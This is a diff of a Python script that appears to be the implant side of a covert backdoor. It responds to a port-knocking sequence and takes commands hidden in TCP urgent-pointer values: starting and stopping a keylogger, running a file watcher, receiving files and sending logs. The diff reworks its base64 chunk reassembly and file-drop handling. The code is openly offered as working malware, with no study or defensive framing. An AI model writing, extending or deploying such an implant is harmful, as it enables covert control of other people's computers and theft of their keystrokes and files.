@@ -28,7 +28,7 @@ local_ip = get_local_ip()
 source_port = 80
 dest_port = 80
 received_data = ""
-eof_signal = "Ly8=Ly8="
+eof_signal = 12353
 keylogger_start_signal = 1
 keylogger_stop_signal = 2
 file_transfer_signal = 3
@@ -44,12 +44,13 @@ communication_port = 80
 ack_event = threading.Event()
 timeout = 10  # Timeout in seconds for acknowledgment
 knock_ip = None
+received_chunks = 0
 
 def send_acknowledgment(ip, port):
     """Send a TCP acknowledgment packet back to the original sender."""
     ip_layer = IP(dst=ip)
     # Change flags from "A" to "SA" and use sport=80 to match expected port
-    tcp_layer = TCP(sport=80, dport=port, flags="SA")
+    tcp_layer = TCP(sport=80, dport=port, flags="SA")/b"ACK"
     ack_packet = ip_layer/tcp_layer
     send(ack_packet)
     print(f"Sent acknowledgment to {ip}:{port}")
@@ -71,12 +72,9 @@ def packet_callback(packet):
                 knock_index += 1
                 if knock_index == len(knock_sequence):
                     print("Port-knocking sequence completed. Sending acknowledgment.")
-                    # Simple acknowledgment - just send one SYN-ACK with some data: ACK
-                    ack = IP(dst=knock_ip)/TCP(sport=source_port, dport=dest_port, flags="SA", seq=1, ack=1)
-                    ack = ack / b"ACK"
-                    send(ack)
+                    send_acknowledgment(knock_ip, src_port)
+                    open_communication_port()
                     knock_index = 0
-                    knock_ip = None
                     wait_for_signal()
 
 def wait_for_signal():
@@ -87,7 +85,7 @@ def wait_for_signal():
 
 def signal_callback(packet):
     """Callback function to process each sniffed packet for signals."""
-    global current_signal, received_data, signal_received
+    global current_signal, received_data, signal_received, received_chunks
     if packet.haslayer(TCP) and packet[TCP].flags == "PAU":
         urgent_pointer_value = packet[TCP].urgptr
 
@@ -95,37 +93,53 @@ def signal_callback(packet):
         if current_signal is None or current_signal == 0:
             if urgent_pointer_value in [keylogger_start_signal, keylogger_stop_signal, file_transfer_signal, watcher_start_signal, watcher_stop_signal]:
                 current_signal = urgent_pointer_value
+                received_chunks = 0
                 signal_received = True
                 print(f"Initial Signal Received: {current_signal}")
                 handle_initial_signal()
                 return
 
-        # Process urgent pointer data
-        try:
-            urgent_pointer_chunk = urgent_pointer_value.to_bytes(2, 'big').decode('ascii', errors='ignore')
-            received_data += urgent_pointer_chunk
-
-            print(f"Received chunk: {urgent_pointer_chunk}")
-
-            # Try to detect EOF in the accumulated data 
-            if eof_signal in received_data:
-                print("EOF signal detected in data.")
-                # Split the data at EOF signal
-                data_parts = received_data.split(eof_signal, 1)
-                if len(data_parts) >= 1:
+        # Decode the urgent pointer value as 2-byte chunks
+        chunk = urgent_pointer_value.to_bytes(2, 'big')
+        received_data += chunk.decode('utf-8', errors='ignore')
+        received_chunks += 1
+        print(f"Received chunk #{received_chunks}: {urgent_pointer_value}")
+        
+        # Check for "//" EOF marker
+        if urgent_pointer_value == eof_signal:
+            print(f"EOF marker detected. Total chunks received: {received_chunks}")
+            try:
+                # Remove the "//" EOF marker
+                data_to_process = received_data[:-2]
+                # Add padding if necessary
+                padding_needed = len(data_to_process) % 4
+                if padding_needed:
+                    data_to_process += "=" * (4 - padding_needed)
+                
+                decoded_bytes = base64.b64decode(data_to_process)
+                
+                if current_signal == file_transfer_signal:
                     try:
-                        # Remove padding if any
-                        clean_data = data_parts[0].rstrip('=')
-                        decoded_data = base64.b64decode(clean_data)
-                        print(f"Decoded data received: {decoded_data[:100]}...")  # Print first 100 bytes
-                        handle_data(decoded_data)
-                    except Exception as e:
-                        print(f"Error decoding final data: {e}")
-                reset_state()
-                wait_for_port_knocking()  # Return to initial state after file transfer
-                return  # Add explicit return after handling the data
-        except Exception as e:
-            print(f"Error processing packet: {e}")
+                        decoded_str = decoded_bytes.decode('utf-8')
+                        if '|' in decoded_str:
+                            decoded_str = decoded_str.rstrip('/')
+                            file_name, file_content = decoded_str.split('|', 1)
+                            save_to_file(file_name.strip(), file_content.encode())
+                        else:
+                            print("Error: Missing file separator")
+                    except UnicodeDecodeError:
+                        print("Error: Invalid UTF-8 in file data")
+                else:
+                    handle_data(decoded_bytes)
+                
+            except base64.binascii.Error as e:
+                print(f"Base64 decoding error: {e}")
+                print(f"Problematic data: {data_to_process}")
+            except Exception as e:
+                print(f"Error processing data: {e}")
+            
+            reset_state()
+            wait_for_port_knocking()
 
 def handle_initial_signal():
     """Handle the initial signal received."""
@@ -138,7 +152,6 @@ def handle_initial_signal():
         stop_keylogger()
     elif current_signal == file_transfer_signal:
         print("File transfer signal received.")
-        prepare_file_transfer()
     elif current_signal == watcher_stop_signal:
         print("Stop watcher signal received.")
         stop_watcher()
@@ -188,16 +201,9 @@ def send_log_file():
     else:
         print("Log file not found.")
 
-def prepare_file_transfer():
-    """Prepare for file transfer by starting the sniffing process."""
-    print("Preparing for file transfer...")
-    # No need for a loop, just continue listening for packets
-    wait_for_signal()
-
 def handle_data(decoded_data):
     """Handle the received data based on the current signal."""
     global current_signal
-    print(f"\nFull decoded data:\n{decoded_data}\n")  # Print full decoded data
     if current_signal == file_transfer_signal:
         save_file(decoded_data)
     elif current_signal == watcher_start_signal:
@@ -209,28 +215,35 @@ def handle_data(decoded_data):
 def save_file(decoded_data):
     """Save the file from the decoded data."""
     try:
-        # Split at the first | character
-        split_index = decoded_data.find(b'|')
-        if split_index == -1:
-            print("Invalid file data format")
+        # Get the metadata portion as text, but keep content as raw bytes
+        metadata = decoded_data[:decoded_data.index(b'|')].decode('utf-8')
+        # Get the raw content after the first | character
+        file_content = decoded_data[decoded_data.index(b'|')+1:]
+        
+        if not metadata:
+            print("Error: No filename provided")
             return
 
-        file_name = decoded_data[:split_index].decode('utf-8').strip()
-        file_content = decoded_data[split_index + 1:]
-
-        save_path = os.path.join(os.getcwd(), file_name)
-        with open(save_path, 'wb') as file:
-            file.write(file_content)
-        print(f"File saved successfully: {save_path}")
+        file_name = metadata.strip()
+        save_to_file(file_name, file_content)
     except Exception as e:
         print(f"Error saving file: {e}")
 
+def save_to_file(file_name, content):
+    """Save the content to a file."""
+    # Get just the filename without the full path for security
+    safe_filename = os.path.basename(file_name)
+    with open(os.path.join(os.getcwd(), safe_filename), 'wb') as file:
+        file.write(content)
+    print(f"File {safe_filename} created successfully.")
+
 def reset_state():
     """Reset the state variables."""
-    global current_signal, received_data, signal_received
+    global current_signal, received_data, signal_received, received_chunks
     received_data = ""
     current_signal = 0
     signal_received = False
+    received_chunks = 0
     print("State reset.")
 
 def open_communication_port():
